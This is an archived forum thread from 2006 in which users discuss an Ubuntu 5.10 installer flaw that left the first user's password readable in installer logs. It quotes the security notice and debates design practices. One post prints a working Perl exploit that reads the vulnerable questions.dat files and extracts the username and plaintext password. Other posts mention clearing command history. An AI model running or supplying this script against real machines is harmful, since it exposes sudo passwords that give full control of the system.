Also, what would the grep command be to search the entire system? (I'll do it with nice -n = 19 :) and clear the command history after)

---

### Post by knalle on 2006-03-13
```
sudo grep -r something /
```

go take lunch

---

### Post by Kurt` on 2006-03-13
Excellent, I plan to. ;)

---

### Post by int on 2006-03-13
[COLOR="Red"]**BUG FIXED**[/COLOR]

update you distro..

> =========================================================== 
Ubuntu Security Notice USN-262-1             March 12, 2006
Ubuntu 5.10 installer vulnerability
CVE-2006-1183
===========================================================

A security issue affects the following Ubuntu releases:

Ubuntu 5.10 (Breezy Badger)

The following packages are affected:

base-config
passwd

The problem can be corrected by upgrading the affected package to
version 2.67ubuntu20 (base-config) and 1:4.0.3-37ubuntu8 (passwd).  In
general, a standard system upgrade is sufficient to effect the
necessary changes.

Details follow:

Karl Øie discovered that the Ubuntu 5.10 installer failed to clean
passwords in the installer log files. Since these files were
world-readable, any local user could see the password of the first
user account, which has full sudo privileges by default.

The updated packages remove the passwords and additionally make the
log files readable only by root.

This does not affect the Ubuntu 4.10, 5.04, or the upcoming 6.04
installer.  However, if you upgraded from Ubuntu 5.10 to the current
development version of Ubuntu 6.04 ('Dapper Drake'), please ensure
that you upgrade the passwd package to version 1:4.0.13-7ubuntu2 to
fix the installer log files.


from [http://www.ubuntu.com/usn/usn-262-1](http://www.ubuntu.com/usn/usn-262-1)

---

### Post by ice60 on 2006-03-13
thanks for the update Colin :) don't feel bad :( at least you are still alive, i think the person responsible for lanman hashes died off a few years ago :-|

---

### Post by Skatox on 2006-03-13
Thanx bro, the update has fixed my problem!! 

Can you see an update released so fast in Windows? :p :p :p :p :mrgreen: :mrgreen: :mrgreen:

---

### Post by Klaidas on 2006-03-13
True ;)
If it was something like closed source commercial company, we would have to wait months and then pay for this update [-(

---

### Post by JimLittle on 2006-03-13
I just found about about this problem, confirmed it, did an update and now it's fixed.  How awesome is that?!?

Thanks to the initial reporter and to the developers who quickly jumped on this problem and issued a fix.  There aren't many software products out there with this kind of response times.

You guys are great!!

---

### Post by szatyor on 2006-03-13
I've just done an upgrade, but I don't know what I've upgraded, BUT, I can't see any passwords in the mentioned files. So, get aan upgrade right now!

---

### Post by Ghetto_Smurf on 2006-03-13
i just love open-source.

not just this or that guy, who has the code, can fix it.

everyone has acess to it, and those who can fix this kind of tuff are the people!

DAMN OPEN-SOURCE IS GOOD!

---

### Post by flametom on 2006-03-13
My password and username was allso shown in plain txt.. realy scarry, Can't understand how this could be possible. Lucky for me it wasen't my own box.

---

### Post by mackinax on 2006-03-13
[QUOTE=cjwatson]... we'll do everything we can to install better defences against this kind of thing in future.[/QUOTE]

I hope that "*we'll do everything we can*" will include making some personnel changes. 
People who are capable of making such a ridiculous mistake *will* do it again.

---

### Post by dbunder on 2006-03-13
Just installed Ubuntu for the first time last night, applied all the updates it prompted me too, and my passwd is nowhere to be seen in /var or anywhere else.  So I guess this just applies to older/unupdated installs.

---

### Post by r4ik on 2006-03-13
[QUOTE=mackinax]I hope that "*we'll do everything we can*" will include making some personnel changes. 
People who are capable of making such a ridiculous mistake *will* do it again.[/QUOTE]

Nope they will learn from there mistakes.

---

### Post by aquarajustin on 2006-03-13
I just installed Dapper Flight-5 last night. Seems to be resolved. Sort of scary though as a Sysadmin plainning to switch a couple of my servers from Sarge to Breezy. Oh well, @!?% happens. :-D

---

### Post by Kazriko on 2006-03-13
I found this on my one system that was installed from scratch on Breezy (an AMD64 system) but all my other systems were upgraded from Hoary and did not have the password in the file.

Luckily not a single person has access to my AMD64 system. :) I changed the text in the file to "iamalamer" for all those pathetic hackers who might want to try and get in.

---

### Post by thetorpedodog on 2006-03-13
[QUOTE=Kazriko]Luckily not a single person has access to my AMD64 system. :) I changed the text in the file to "iamalamer" for all those pathetic hackers who might want to try and get in.[/QUOTE]
Kind of pointless to have the system if nobody (not even you) can use it, eh?

Props to teh team for getting the update out so fast. Unprops to teh other team (teh same team?) for not fixing it before release.

---

### Post by AlphaMack on 2006-03-13
[QUOTE=mackinax]I hope that "*we'll do everything we can*" will include making some personnel changes. 
People who are capable of making such a ridiculous mistake *will* do it again.[/QUOTE]

Agreed.  That was one serious fsckup.

---

### Post by ice60 on 2006-03-13
[QUOTE=mackinax]I hope that "*we'll do everything we can*" will include making some personnel changes. 
People who are capable of making such a ridiculous mistake *will* do it again.

[QUOTE=alphasubzero949]Agreed.  That was one serious fsckup.[/QUOTE][/QUOTE]
it might be a good idea for you both to use something else in the mean time. then if the 'personnel changes' don't happen you'll already be set ;) hope it goes well for you, Arch is supposed to be good.

---

### Post by luzi82 on 2006-03-14
The installer log problem is fixed before I knowing it... wow.

---

### Post by Shimmy on 2006-03-14
Jebus, this is scary.. 
So is it safe to just delete the affected files?

---

### Post by nocturn on 2006-03-14
To be fair, yes it was very bad that this happened.  

But none of my 3 Ubuntu machines were affected anyway for several reasons.

1. I made it a good practice to change the password after the install has completed and I loaded all the latest patches (I do this on all distros/Oss).
2. My server is still on Hoary
3. My laptop was upgraded from Hoary

Even if you do not practice #1, the Breezy release is now almost 6 months old.  
If you are in an environment that requires security against both remote and local users, your policy should have forced you to change your password after 3 months at the latest.

I'm happy with the way this was handled though, a fix was out very quick and they have been very open about this issue.

---

### Post by nocturn on 2006-03-14
[QUOTE=Shimmy]Jebus, this is scary.. 
So is it safe to just delete the affected files?[/QUOTE]

Yes, it seems a lot of users did this before the official fix was out.

---

### Post by cornholio on 2006-03-14
thank you for your work on ubuntu cjwatson. :) 
greetings from germany...

---

### Post by lean on 2006-03-14
So what will the implications of this bug be?

1. I suggest that the the patch that is responsible for this problem is found (it happened somewhere between Hoary and Breezy). 
Who did it, what else has he done? If it was on purpose, it is better to be paranoid, since it apparently is extremely easy to hide backdoors.

2. The patch that fixed the problem for Dapper is found. Why did the author not think of it as a security problem for Breezer?

3. We need to rethink the development process. How can we make secure software? We need to learn from this incident, and make sure that there are no other "backdoors" in Ubuntu.

Is all Ubuntu patches reviewed and signed by two different persons? What about all stuff taken directly from Debian - is their standard high enough for Ubuntu? 

These are big questions, but they need to be answered. Remember that Canonical is supposed to be a catalyst company. This means that they take care of a core system, and provides support on for other companies that want to market or extend Ubuntu. If a transparent development model is not used, these companies will have a harder time offering support for their customers. 
That canonical ´says it works´, is not enough gaurantee. A monetary gaurantee could propably work, but it would propably be a to big task for Canonical to handle. It is better it is outsourced to 3rd party companies. 
If they would like to take this route it could be: If a critical security hole is found before this date, you will get your money back 10 times.

Then Canonical will _need_ to make sure the development process creates secure software. But if it can convince the Canonical financial/insurance staff, it should be able to convince big 3rd party providers. So a monetary gaurantee is kind of pointless.

The easiest way is that Canonical reviews their development process, makes it more transparent and it easy for _everybody_ to see how secure each part is.

---

### Post by Dml on 2006-03-14
As i can gather from explanations, it happened because the database with answers was not properly cleaned up...
I have some ideas about such situations... 

IMO the security problem is not mistake of not cleaning the password itself. 
Such mistakes are inevitable in any project, as project grows, it may happen that one part (that stores passwords) get changed, and other part (that clear up passwords) are not changed in synch. The security problem is in how installation is organized - security relies on afterthought-based solution such as cleaning up password, rather than correct solution - encrypting and using the password right after it is entered without storing this answer. If it means modifying the installer... so be it.

Isn't it the adwantage of open source that one can *fix* software [not store passwords] instead of writing *external workaround* [clean up as afterthought] ? I would expect this kind of security problem from closed source software + few workarounds, where security is merely afterthought, not from linux distro. It seems that it is vital to change the strategy from workarounds to fixes, or such problems will appear quite regularly. It will be matter of time until such bug is discovered by hacker rather than honest user and will be seriously exploited. And this is going to seriously damage the reputation of ubuntu project and even linux. Often, people say that linux is simple to install meaning that specific distro is simple to install. This works other way too. Similarly, people will say that linux is insecure meaning that specific distro is insecure. In reply, pro-linux zealots will say that it's only this specific distro sux and not linux in general, etc. We don't want this situation, right?

On positive side, it's good how quickly workaround was released.
Also, this problem did not affect me because i changed password after install. (i did that only because i did not know of sudo letting root access to one who knows password. I intended to use user_password for user and root_password for root, but after install i have found that user's password essentially gives root access, and changed user's password to root password instead)

---

### Post by JoWilly on 2006-03-14
[QUOTE=lean]So what will the implications of this bug be?

1. I suggest that the the patch that is responsible for this problem is found (it happened somewhere between Hoary and Breezy). 
Who did it, what else has he done? If it was on purpose, it is better to be paranoid, since it apparently is extremely easy to hide backdoors.

2. The patch that fixed the problem for Dapper is found. Why did the author not think of it as a security problem for Breezer?

3. We need to rethink the development process. How can we make secure software? We need to learn from this incident, and make sure that there are no other "backdoors" in Ubuntu.

Is all Ubuntu patches reviewed and signed by two different persons? What about all stuff taken directly from Debian - is their standard high enough for Ubuntu? 

These are big questions, but they need to be answered. Remember that Canonical is supposed to be a catalyst company. This means that they take care of a core system, and provides support on for other companies that want to market or extend Ubuntu. If a transparent development model is not used, these companies will have a harder time offering support for their customers. 
That canonical ´says it works´, is not enough gaurantee. A monetary gaurantee could propably work, but it would propably be a to big task for Canonical to handle. It is better it is outsourced to 3rd party companies. 
If they would like to take this route it could be: If a critical security hole is found before this date, you will get your money back 10 times.

Then Canonical will _need_ to make sure the development process creates secure software. But if it can convince the Canonical financial/insurance staff, it should be able to convince big 3rd party providers. So a monetary gaurantee is kind of pointless.

The easiest way is that Canonical reviews their development process, makes it more transparent and it easy for _everybody_ to see how secure each part is.[/QUOTE]


I see you are just dropping into this thread.

If you go up a few pages, you will find Colin Watson's post. He is expaining what happened, why and is answering your questions and saying that they will take necessary steps to improve QA.

He has also posted the same on osnews.

Furthermore, if you would have taken the time to get an insight instead of dropping in, you would also know that the patch was applied to dapper AND breezy.

---

### Post by Dml on 2006-03-14
my opinion reworded for better clarity(i hope):  
real problem is not failure to clear up password from database - such kind of failure happen with inevitability. Real problem is storing password in this answers database(that is also written to logs) in first place, so that workaround/afterthought script then removes it from database. This kind of "solution" rely on developer remembering to modify password cleanup part after modifying something about where answers is stored (that is controlled by parameters i suppose) - sure it's inevitably going to be forgotten, sooner or later, and some of such mistakes will go unnoticed into release. 
Sure Q&A and testing and careful coding and everything is important. But it is also very important to avoid "security as afterthought" approach that is too unreliable as this case clearly demonstrates (some changes accidently introduce hole, other accidently close hole, etc. without anyone's knowledge, that's not good at all).
(above is my personal opinion. yesterday i have readed few (6+) pags of this thread. but i don't have enough time to read everything so if i miss something there, feel free to correct me)

---

### Post by Nite_Hawk on 2006-03-14
[QUOTE=Dml]my opinion reworded for better clarity(i hope):  
real problem is not failure to clear up password from database - such kind of failure happen with inevitability. Real problem is storing password in this answers database(that is also written to logs) in first place, so that workaround/afterthought script then removes it from database. This kind of "solution" rely on developer remembering to modify password cleanup part after modifying something about where answers is stored (that is controlled by parameters i suppose) - sure it's inevitably going to be forgotten, sooner or later, and some of such mistakes will go unnoticed into release. 
Sure Q&A and testing and careful coding and everything is important. But it is also very important to avoid "security as afterthought" approach that is too unreliable as this case clearly demonstrates (some changes accidently introduce hole, other accidently close hole, etc. without anyone's knowledge, that's not good at all).
(above is my personal opinion. yesterday i have readed few (6+) pags of this thread. but i don't have enough time to read everything so if i miss something there, feel free to correct me)[/QUOTE]

You are absolutely correct.  The biggest failure here is not that the passwords were left in the database and hence ended up in the logs.  It's that the passwords were put in the database in the first place!

Colin, why is the password being read into the database?  Is it just because that's how those dialogs generally work in debconf?  Is anything done with the password other than setting it on the system?  Does debian also suffer from having passwords read (and then scrubbed) from this database via debconf?  This problem goes deeper than just scrubbing the database.  I think the Ubuntu developers need to start thinking about redesigning the way that passwords are initially entered during installation.  Even leaving them in system memory is dangerous as by that time it's possible the machine is network enabled for the installation and may already have an attack initiated against it.

Nite_Hawk

---

### Post by nocturn on 2006-03-14
I'm speculating here.  But I think the reason this happened is because it asked username and  password and saved them together with the other install options.

The actual execution only started when all answers where collected, so the adduser command ran with the cached values some time after they were entered.

---

### Post by Dml on 2006-03-14
Yes, that's what i thought too - but it is not very good idea either. You can ask for password at the point when you gonna execute adduser, that'd be a logical time when to ask.

---

### Post by the_lamp on 2006-03-14
First of all:  sudo wipe -rf /var/log/installer


In all the discussion of how quickly this "bug" was "fixed" what gets lost a bit is how utterly, fundamentally flawed this was to begin with.  It wasn't a bug.   A bug is a buffer overrun or a missing semi-colon.  This was someone who doesn't know good software design principles.  The true fix will be when this person is publicly voted off ubuntu island.  ubuntu hasn't truely owned up to this **** up so there's no reason to believe that something equally stupid won't happen again.

---

### Post by knalle on 2006-03-14
the_lamp:

mr first poster, why don't you go fix dapper then?

---

### Post by fsckme on 2006-03-14
the_lamp: The installer team have done way more than a stupid mistake. Get over it. You are human, aren't you? Please don't tell me that you're unable of making mistakes. I had the patch applied before i even found out about this problem (but I still have to get around to a few servers that I couldn't update today).

I don't say this isn't a serious issue, but it's still a very doable mistake if you read Colins explanation. And it sure won't happen again.

But I wonder - are the .ISOs of Breezy going to be updated? Lots of users install Breezy without internet, and surely many of them give other users access to their computers. This problem is way too easy to exploit, even my grandmother could do it. And she has never used Linux, in addition of being dead.

Yeah, I know I don't have much to say since this is my first post and I signed up today. But still - I would've been angry if someone came and told me my password after using my computer. It is an easy fix, but I'm pretty sure a lot of Breezy users never will know about this, and they better have internet!

---

### Post by knalle on 2006-03-14
[QUOTE=fsckme]This problem is way too easy to exploit, even my grandmother could do it. And she has never used Linux, in addition of being dead.
[/QUOTE]

:mrgreen:

---

### Post by andlinux on 2006-03-14
You can find on a lot of hacker websites the exploit.

```
#!/usr/bin/perl -w

use warnings;
use strict;

##############################################################################
# Author: Kristian Hermansen
# Date: 3/12/2006
# Overview: Ubuntu Breezy stores the installation password in plain text
# Link: https://launchpad.net/distros/ubuntu/+source/shadow/+bug/34606
##############################################################################

print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "Kristian Hermansen's 'Eazy Breezy' Password Recovery Tool\n";
print "99% effective, thank your local admin ;-)\n";
print "FOR EDUCATIONAL PURPOSES ONLY!!!\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n";

# the two vulnerable files
my $file1 = "/var/log/installer/cdebconf/questions.dat";
my $file2 = "/var/log/debian-installer/cdebconf/questions.dat";

print "Checking if an exploitable file exists...";
if ( (-e $file1) || (-e $file2) )
{ 
  print "Yes\nNow checking if readable...";
  if ( -r $file1 )
  {
    getinfo($file1);
  }
  else
  {
    if ( -r $file2 ) {
      getinfo($file2);
    }
    else {
      print "No\nAdmin may have changed the permissions on the files :-(\nExiting...\n";
      exit(-2);
    }
  }
}
else
{
  print "No\nFile may have been deleted by the administrator :-(\nExiting...\n";
  exit(-1);
}

sub getinfo {
  my $fn = shift;
  print "Yes\nHere come the details...\n\n";
  my $realname = `grep -A 1 "Template: passwd/user-fullname" $fn | grep "Value: " | sed 's/Value: //'`;
  my $user = `grep -A 1 "Template: passwd/username" $fn | grep "Value: " | sed 's/Value: //'`;
  my $pass = `grep -A 1 "Template: passwd/user-password-again" $fn | grep "Value: " | sed 's/Value: //'`;
  chomp($realname);
  chomp($user);
  chomp($pass);
  print "Real Name: $realname\n";
  print "Username: $user\n";
  print "Password: $pass\n";
}
```

;)

---

### Post by Nite_Hawk on 2006-03-14
[QUOTE=fsckme]the_lamp: The installer team have done way more than a stupid mistake. Get over it. You are human, aren't you? Please don't tell me that you're unable of making mistakes. I had the patch applied before i even found out about this problem (but I still have to get around to a few servers that I couldn't update today).

I don't say this isn't a serious issue, but it's still a very doable mistake if you read Colins explanation. And it sure won't happen again.

But I wonder - are the .ISOs of Breezy going to be updated? Lots of users install Breezy without internet, and surely many of them give other users access to their computers. This problem is way too easy to exploit, even my grandmother could do it. And she has never used Linux, in addition of being dead.

Yeah, I know I don't have much to say since this is my first post and I signed up today. But still - I would've been angry if someone came and told me my password after using my computer. It is an easy fix, but I'm pretty sure a lot of Breezy users never will know about this, and they better have internet![/QUOTE]

You are 100% correct that mistakes happen, and that this was an easy mistake to make.  The problem is that the current design is broken in that it allows for such easy mistakes in the first place.  You should never need to remember to stop a password from leaking to log files.  It's not obvious, and it's bound to become a problem again unless the behavior is changed.  Specifically, the password should only be in plaintext in protected memory, and only for as long as it takes to make the necessary system calls, which should happen immediately.  

The ubuntu installer as a whole is wonderful.  The team has done a ton of great work.  This is extremely important though.  Simply stopping the password from leaking to the log files isn't good enough.

Nite_Hawk

---

### Post by j5tixc on 2006-03-14
[QUOTE=Dml]This kind of "solution" rely on developer remembering to modify password cleanup part after modifying something about where answers is stored (that is controlled by parameters i suppose) - sure it's inevitably going to be forgotten, sooner or later, and some of such mistakes will go unnoticed into release.[/QUOTE]

That's a really good point. It's a flaw in the methodology with which this project is created. Also this bug has existed for over 5 months and surely someone has discovered this earlier. Who know how many systems are compromised. The last thing the Linux and Ubuntu community needs are huge security holes like this because Linux is supposed to be all about being more secure than the alternatives.

For example the NetBSD installer runs the passwd command directly during installation, so the installer never sees the password.

No wonder the update came out really fast, the only thing that had to be done was removing a line in a file and chmodding it. That can be done with less than 10 lines of code! You can't compare this to Windows bugs where the bug is a deep rooted issue in some dll that handles images.

---

### Post by Dml on 2006-03-14
[QUOTE=j5tixc]You can't compare this to Windows bugs where the bug is a deep rooted issue in some dll that handles images.[/QUOTE]
nah, there will be time of deep bugs too. First you notice simple mistakes, then come complex, and there's usually many more subtle msitakes than simple ones. edit: i.e. i mean if it takes so long to notice so obvious bug in popular distro, it's not too surprising we don't know of more complicated ones. I wouldn't bet on image handling libraries typically used under linux being free of buffer overruns.

---

### Post by j5tixc on 2006-03-14
[QUOTE=Dml]nah, there will be time of deep bugs too. First you notice simple mistakes, then come complex, and there's usually many more subtle msitakes than simple ones. edit: i.e. i mean if it takes so long to notice so obvious bug in popular distro, it's not too surprising we don't know of more complicated ones. I wouldn't bet on image handling libraries typically used under linux being free of buffer overruns.[/QUOTE]

Yes I definitely agree that there are more serious bugs out there. Especially since this "easy" bug has been undetected for so long, so much for open source...

My point was really that in terms of patch time you can't compare this to a Windows bug. No wonder a patch that has to fix a deep rooted issue in a dll-file takes longer to create and test than this. A patch that only has to chmod a file and delete a line from it. That's less than 10 lines of code, had it taken longer than it did it would have been a scandal. The fact that this patch came out fast isn't impressive at all considering how much work it took.

---

### Post by imagine on 2006-03-14
[QUOTE=Dml]i mean if it takes so long to notice so obvious bug in popular distro[/QUOTE]I know what you mean, but Teotihuacan wasn't the first person to notice the problem, but to report it.
To be exactly, some people knew about the problem even before Ubuntu 5.10 was released, but then again this may be like the world-readable home directory [1]: For some it's a serious issue, for others it's not. After all the most common place where Ubuntu is used is probably at home, where there either is only one single user or where the few other users are all members of the family. And since you needed a valid user account to be able to exploit this bug there was no great danger in those cases.

I'm in no way saying that this bug should be ignored or forgotten, but I think the attention this bug gets is way over the top. By the amount of comments on other websites you may think this is the most serious bug in the history of Linux, when in reality it was a security flaw which allowed local users to gain superuser rights, was fixed within 9 hours and until now I didn't hear from anyone who was affected by this bug. There are probably three local privilege escalation bugs found in the Linux kernel and subsystem *every year* and on some other operating systems you don't even need to bother searching for bugs since all users have superuser rights by default.
So, yes that was a security flaw, it is good and necessary that it's fixed and it should of course never happen again. But I don't see a need to crawl on the ground saying "shame on us" for the next three months and claiming that the developers of the installer have absolutely no sense of security.
Keep the feet on the ground.


Btw I have the impression that the actual reason why there's so much fuss about this bug is that it's comprehensible for everyone. It's not some magical pass-a-string-of-length-8389-back-to-function-foobar buffer overflow, but something every user can understand and reproduce, making the bug somewhat... appealing.



[1] [http://ubuntuforums.org/showthread.php?t=144111](http://ubuntuforums.org/showthread.php?t=144111)

---

### Post by RLJ on 2006-03-14
Farely new to Linux. 
Now heres something strange. After this was reported, and the update came out yesterday, today when I rebooted, It booted as Kubuntu. Then after I logged in, it logged me in as Ubuntu. It was Ubuntu before this update.

Anyone else getting this?

Rod
aka RLJ

---

### Post by Dml on 2006-03-15
[QUOTE=imagine]I know what you mean, but Teotihuacan wasn't the first person to notice the problem, but to report it.
To be exactly, some people knew about the problem even before Ubuntu 5.10 was released... [/QUOTE]
It's even worse if it was known but not fixed or not reported...

again, the problem comes from practices used as i have said on prev. page. not from this specific cleanup mistake. And the practices problem is serious.

---

### Post by LordHunter317 on 2006-03-15
[QUOTE=Dml]my opinion reworded for better clarity(i hope):  
real problem is not failure to clear up password from database - such kind of failure happen with inevitability. Real problem is storing password in this answers database(that is also written to logs) in first place, so that workaround/afterthought script then removes it from database. This kind of "solution" rely on developer remembering to modify password cleanup part after modifying something about where answers is stored (that is controlled by parameters i suppose) - sure it's inevitably going to be forgotten, sooner or later, and some of such mistakes will go unnoticed into release.[/quote]Any solution involving not writing passwords to the answers file in the first place requires **the developer to note the answer as a password anyway**, so the potential for creating this bug is the same.  This isn't a solution, it's a non-sequitur.  The developer still has to remember to treat the field specially.

> But it is also very important to avoid "security as afterthought" approach that is too unreliable as this case clearly demonstratesIt doesn't demonstrate that in the least.   It demonstrates a human error was made, no more, no less.

There is no good solution for problems like this.  Passwords are a special case, they always must be treated specially.  There is no way to enforce their special treatment, because there is no way for the computer to know it is a pasword.  Which means the developer must tell it that the field is a password.  And if the developer makes a mistake doing this, the result is what occured here.

And even with the best QA processes on Earth, these errors still will occur.  Humans checking humans still make mistakes, and we already established that a computer can't verify this, so...

[quote=the_lamp]In all the discussion of how quickly this "bug" was "fixed" what gets lost a bit is how utterly, fundamentally flawed this was to begin with. It wasn't a bug.[/quote]Yes, it was a bug.  A bug is any operation of software other than intended.

> This was someone who doesn't know good software design principles.What principles were violated?  The answer is none, but I'd absolutely love to see you defend this.

> The true fix will be when this person is publicly voted off ubuntu island. ubuntu hasn't truely owned up to this **** upYes, they have.  They've followed the policies and procedures for security flaws.  What else would you have them do?  Mistakes happen.  There's no reason to believe this wasn't a mistake.

This is exactly why the goverment spends tons of money on testing for these sorts of things, especially in life-saftey systems.  And the net result is always they cannot remove all the bugs, so they install multiple redundant systems so that if a bug occurs, operation can still continue.

For example, on a project I've worked on, there's multiple software and hardware lockouts and full manual control of the equipment so if the software fails, the life-saftey system can still be operated independent of the software.

> so there's no reason to believe that something equally stupid won't happen again.This is why security is a process.

[quote=Nite_Hawk]You are 100% correct that mistakes happen, and that this was an easy mistake to make. The problem is that the current design is broken in that it allows for such easy mistakes in the first place. You should never need to remember to stop a password from leaking to log files.[/quote]The only alternative is to manually specify that each independent question be logged.  Given that the special cases that shouldn't be logged are greately outnumbered by the cases that should be, it's questionable this is really worth it.

> Specifically, the password should only be in plaintext in protected memory, and only for as long as it takes to make the necessary system calls, which should happen immediately.Why?  For the installer, this is a complete non-issue.  How can memory be read if the installer is the only thing
running?

I'm going to politely once, ask the whole community a simple request:  If you don't do security research or software development for a living, kindly don't suggest a way to fix this problem or why this problem is wrong.  It's just as bad as giving a mechanic advice to fix your car.  It doesn't help and it only seves to aggrevate them.

---

### Post by knalle on 2006-03-15
[QUOTE=LordHunter317]It doesn't demonstrate that in the least.   It demonstrates a human error was made, no more, no less.[/QUOTE]
WORD!
[QUOTE=LordHunter317]I'm going to politely once, ask the whole community a simple request:  If you don't do security research or software development for a living, kindly don't suggest a way to fix this problem or why this problem is wrong.  It's just as bad as giving a mechanic advice to fix your car.  It doesn't help and it only seves to aggrevate them.[/QUOTE]
I still think everybody should discuss security issues so we can learn, but going after the developer(s) and "demanding" stuff is just lame and not helping ubuntu or linux or yourself

WORD again!

---

### Post by LordHunter317 on 2006-03-15
[QUOTE=knalle]I still think everybody should discuss security issues so we can learn, but going after the developer(s) and "demanding" stuff is just lame and not helping ubuntu or linux or yourself[/quote]Which is my point.  The people making these demands have no position to make them from.  It's one thing to learn and ask, "What can be done to make tihs not happen again," it's another thing to try to claim, "We should do this, that, or the other," like several people have had that actually won't help a thing.  It only serves to charge an already seriously charged issue and doesn't get anyone any closer to solving the problem.

---

### Post by JoWilly on 2006-03-15
[QUOTE=LordHunter317]Which is my point.  The people making these demands have no position to make them from.  It's one thing to learn and ask, "What can be done to make tihs not happen again," it's another thing to try to claim, "We should do this, that, or the other," like several people have had that actually won't help a thing.  It only serves to charge an already seriously charged issue and doesn't get anyone any closer to solving the problem.[/QUOTE]

Absolutely.

---

### Post by Dml on 2006-03-15
Password IS being treated specially in the installer. Nobody forgot to treat password specially as far as i can tell. Developers aren't so stupid to forget that. 
Developer is not infallible, but isn't like computers with RAM altered at random by cosmic rays either - rate of mistakes depends to situation and mistake type.

From explanations, i think what was forgotten is updating one piece of code after updating other piece of code. If developer who changed one part of instalaltion did not know of cleanup thing, i.e. did not know it is fragile under such changes, it isn't his mistake, just like it isn't your mistake if you happen to step onto landmine when walking to the work over public park.

Such problems happens with inevitability whever there is two seemingly unrelated pieces of code that is interdependant(landmine). This mistake is not even security-specific, it happens in any software. Such problems is minimized by design rule of avoiding coupling where it can be avoided.  

There is task, get password and add user. There is code that gets answers, it is not quite suitable for this task because it writes answers to log file. Developer is not stupid, and do understand it is not right to have password in log file. There's two types of solutions, ones that is close to problem (that don't store password into database in first place), and ones that is more remote (cleaning up database before logs are written) I think any developer will agree that these two solutions is not equally good for maintenance - ones that is remote from problem is more fragile and will break as in this case. It will sit there waiting for somebody to step onto it. Not storing in database might not be perfect, but it is less of danger to future changes.

Coding standards exist for a reason - to minimize number of mistakes. Like everything else, coding standards has to be refined and improved based on experience with mistakes.

p.s. i'm is programmer/researcher developing software rendering. I'm is as guilty of workarounds as everyone else is. But it is necessary to avoid this kind of workarounds whenever possible. I feel strongly about it because i have to deal with workarounds (and my own workarounds, sometimes).

---

### Post by Dml on 2006-03-15
[QUOTE=LordHunter317]Which is my point.  The people making these demands have no position to make them from.  It's one thing to learn and ask, "What can be done to make tihs not happen again," it's another thing to try to claim, "We should do this, that, or the other," like several people have had that actually won't help a thing.  It only serves to charge an already seriously charged issue and doesn't get anyone any closer to solving the problem.[/QUOTE]
Agreed. But some intelligent discussion on cause and prevention of such problems can be productive. Yes, human mistake has been made, but what's about looking deeper, how rate of such mistakes can be decreased without unreasonable demands of code quality from developers? The design practices is there mostly to decrease rate of human mistakes, and above all, avoid getting into some situation when inevitable mistake has bad consequences.

---

### Post by knalle on 2006-03-15
the only thing i can actually comment on this bug and it's fix is from Colin Watsons description of how the bug was made.

What strikes me is that the Ubuntu installer has reached a level of compexity that opens for more human errors. if i am not mistaken the ubuntu installer originated as a fork or rewrite of debconf installer(am i right here?) and that this fork used a lot of time to be accepted into debian and that was the start of the ubuntu in the first place?

the reason i write this is because my old debian friends laugh at me and says that ubuntu has still to grow up :-( and in this case they're right, its still a pretty new system

but the debians can STFU too, because afik slackware keeps the installer even simpler and doesn't require a DATABASE to install a good Linux system

---

### Post by knalle on 2006-03-15
just to clearify what im ranting about;

if we are looking for "good practice" and "sound enginering decission taking" why does Linux fork more than toads on a rainy day?

if its "the purity of the art of code" we are after why didn't the ubuntu developers just fix debian instead of forking? why didn't debian fix slackware instead of creating a new Linux(this is flamebait i know).

for each time there is a fork or a rewrite we will have to accept bugs like these as they are because it will always represent some technical backtracking

---

### Post by LordHunter317 on 2006-03-15
[QUOTE=Dml]Password IS being treated specially in the installer.[/quote]Yes, by a human.

>  Nobody forgot to treat password specially as far as i can tell.They obviously did or this security problem wouldn't have happened.

> Developers aren't so stupid to forget that. I don't think forgetfulness and stupidity have anything to do with each other.  I forget my class notes all the time, but I think it would be a tiny bit presumptious to call an undergraduate EE student stupid.

> There is task, get password and add user. There is code that gets answers, it is not quite suitable for this task because it writes answers to log file.And as I pointed out, changing the way this code functions would hurt more people than it helped.  Yes, not changing it leaves the potential for flaws like this.  Such flaws are very small though, so it's questionable if it's worth putting the developers through a lot of extra work for a small gain in security.  In pure ecnomic terms, I'm pretty sure the answer would always be no: the gain would be probably orders of magnitude smaller than the cost.

>  I think any developer will agree that these two solutions is not equally good for maintenance - ones that is remote from problem is more fragile and will break as in this case.Yes, but you're failing to consider all the issues.  This one problem that occured can't be the sole basis for making a decision about the debconf answer database.

> Not storing in database might not be perfect, but it is less of danger to future changes.At a cost to the developers who use the database for debugging and to all the other code used by the installer, as now it has to be told to manually log the answers.  This is a costly change.

> But it is necessary to avoid this kind of workarounds whenever possible.No, that's not true.  That's not good software engineering practices or even general engineering practices.  It's not apparent in this case that the costs outweight the gain, or that even fixing the potential problems by not changing how the logging is done by cdebconf is worthwhile.  If this is the worse level of exploit that can be leveraged, it should be left alone.

If that's unacceptable, a simpler solution is to have the user prompted to remove the files at the end of the install, with a note that sensitive information may be stored in them, but removing them may make debugging errors that occured during installation more difficult.  If any change is to be made, this is likely the most sensible one.
  
> I feel strongly about it because i have to deal with workarounds (and my own workarounds, sometimes).That doesn't mean their an absolute evil or that other things don't trump them.

[quote=Dml]Agreed. But some intelligent discussion on cause and prevention of such problems can be productive[/quote]The discussion being made by most parties here is anything but intelligent or productive.  Calls for firing aren't going to help anyone.  Suggestions that don't consider all the issues aren't going to help anyone.

> Yes, human mistake has been made, but what's about looking deeper, how rate of such mistakes can be decreased without unreasonable demands of code quality from developers?IANA cdebconf expert but I'm fairly certain the answer is, "There aren't any."

Generally, industry solves this with an increase in external QA and testing processes for the affected subsystem.  That certainly is a solution, but I'm in no place (nor is anyone else who doesn't work for Canonical) in a position to say would actually work here.

---

### Post by j5tixc on 2006-03-15
You can deny this all you want but there are solutions and coding practices that greately reduce the risk of problems like these. Just look at the NetBSD installer, it runs the passwd command directly during installation, so the installer never sees the password.

---

### Post by johnnyis42 on 2006-03-15
alot of interesting points, alot of... well... other points.

as for me, simply trolling the forums because i am brand new to ubuntu, found this thread, began the search through my system for plaintext instances of my password, came up empty.

now, i had just installed ubuntu 2 days ago, and looking at the history, the patch was implimented 3 days ago.

pretty good for me, and also for all the folks who will be installing 5.10 on other machines from here on out.  i've got to give it to the dev team on this one, very quick fix.  

